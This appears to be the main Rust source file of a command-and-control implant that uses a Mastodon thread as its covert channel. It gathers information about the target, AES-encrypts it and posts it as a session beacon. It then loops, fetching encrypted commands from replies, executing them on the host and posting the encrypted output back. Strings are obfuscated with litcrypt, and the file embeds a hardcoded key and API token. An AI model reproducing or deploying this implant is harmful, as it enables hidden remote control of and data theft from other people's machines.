pub mod args;
use args::extract_args;

pub mod utils;
use utils::*;

pub mod modules;
use modules::*;

use env_logger::Builder;
use log::{info,debug};
use regex::Regex;

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

#[tokio::main]
async fn main() {
    // Build logger
    let common_args = extract_args();
    Builder::new()
        .filter(Some("rec2"), common_args.verbose)
        .filter_level(log::LevelFilter::Error)
        .init();

    // AES KEY its automaticaly change from Makefile
    let key = lc!("TMVB5XJWzuz4KsqUCnwxrtooQv8LmP6R4IX62HeQ7OZzhxgsahsxNzfo5dJNkntl").as_bytes().to_owned();

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // TO CHANGE manually!
    // MASTODON TOKEN <https://mastodon.be/settings/applications>
    let token = lc!("fdYcCvUiBplODBs1BGWccVax16ko4M4nZgudH7mUX2xUTVj35o0jSm2Ka5LPOYyd").to_owned();
    // MASTODON FULL URL
    let full_url = lc!("https://mastodon.be/@username_fzihfzuhfuoz/109994357971853428").to_owned();
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Link command:result
    let mut list_commands: Vec<String> = Vec::new();

    // Target info
    let infos = get_target_info();
    debug!("Target info: {}", infos);
    let session_hash = random_string(8);
    debug!("Session hash: {}", session_hash);

    // Parse url first
    let (url, _username, topic_id) = parse_mastodon_url(&full_url);
    // Post target info and session id
    // SESS:{hash}:ABCDEF for new session
    let encoded = hex::encode(&aes_encrypt(&infos.as_bytes(),&key)[..]);
    mastodon_post_topic_comment(
        &url,
        token.to_owned(),
        Some(topic_id.to_owned()),
        encoded,
        format!("SESS:{}:ABCDEF:",&session_hash),
    ).await;

    // MASTODON IMPLANT
    loop {
        // GET TOPIC comments on Matodon only for this SESSION hash
        // QUES:{hash}:{}
        let (result_spoiler,result_content,in_reply_to_id) = mastodon_get_topic_comments(
            &url,
            token.to_owned(),
            topic_id.to_owned(),
            format!("QUES:{}",&session_hash).to_string(),
        ).await;

        // Check if new comment was posted
        for i in 0..result_content.len() {
            let (_msg_type, session_hash, job_hash) = parse_spoiler(&result_spoiler[i]);
                
                if !list_commands.contains(&job_hash) {
                    info!("main():Mastodon: New command to run {:?}",&result_content[i]);
                    // History
                    list_commands.push(job_hash.to_owned());
                    // Trying to decode hexa to get command line
                    let u8command = aes_decrypt(&hex::decode(&result_content[i].to_owned().to_string()).unwrap()[..], &key);
                    // Trying to run command line
                    let output = run_and_crypt(display_vecu8(&u8command), key.to_owned());
                    info!("main():Mastodon: Output for new command {:?}", &output);
                    // Text limite de 500 caractères
                    if output.len() <= 500 {
                        // POST result on Mastodon
                        mastodon_post_topic_comment(
                            &url,
                            token.to_owned(),
                            in_reply_to_id.to_owned(),
                            output,
                            format!("RESP:{}:{}:",&session_hash,&job_hash),
                        ).await;
                    }
                    else {
                        let re = Regex::new(r"[a-z0-9]{1,475}").unwrap();
                        let caps = re.captures_iter(&output);
                        let mut count = 1;
                        for value in caps {
                            // POST result on Mastodon
                            debug!("Part {}",&count);
                            mastodon_post_topic_comment(
                                &url,
                                token.to_owned(),
                                in_reply_to_id.to_owned(),
                                value[0].to_string(),
                                format!("PART:{}:{}:{}",&session_hash,&job_hash,count),
                            ).await;
                            count +=1;
                        }
                    }
                }
        }
        sleep(31);
    }
}